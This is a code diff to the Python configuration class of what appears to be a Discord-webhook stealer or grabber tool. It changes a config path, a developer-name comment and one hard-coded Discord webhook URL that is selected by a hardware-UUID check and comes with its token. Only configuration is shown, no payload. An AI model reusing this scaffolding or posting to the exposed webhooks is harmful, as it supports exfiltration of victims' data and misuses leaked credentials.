@@ -3,7 +3,7 @@ import subprocess
 
 class Config:
     def __init__(self):
-        with open('config.json', 'r') as f:
+        with open('tools/config.json', 'r') as f:
             self.data = json.load(f)
         self.eb_color = self.data['EB_COLOR']
         self.eb_footer = self.data['EB_FOOTER']
@@ -12,10 +12,10 @@ class Config:
         self.wh_avatar = self.data['WH_AVATAR']
         self.wh_name = self.data['WH_NAME']
         
-        self.hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip() # DEVELOPER ICExFS AREA BABY
+        self.hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip() # DEVELOPER PIERRO AREA BABY
         if self.hwid == "5A25762A-89E6-8A18-A523-00D861C74757":
             self.debug_mode = True
-            self.webhook = "https://canary.discord.com/api/webhooks/1084159527227773099/jyo1mFXijM_78V1F5GLgbIbxhjVeZM5XUzqM0Oa8ZR-5VDXoBHnbls-HtsAsQrvk4aBb"
+            self.webhook = "https://canary.discord.com/api/webhooks/1084155924966551623/61AwNO81f0D61wBsX_u0v1z0uLcgfOVfUhOG3DjHdOg2g8nR3EmB9NYs2upA-BqeBj1n"
         if self.hwid == "38444335-3832-5730-3539-395738324435":
             self.debug_mode = True
             self.webhook = "https://discordapp.com/api/webhooks/1083460332959305738/K1r9VnN01DE8XDTyNm0H3QUBzBGBAUrE9FbImM6VLgGcQ0I5IaxSTgZiyP7nrGSIJsaF"
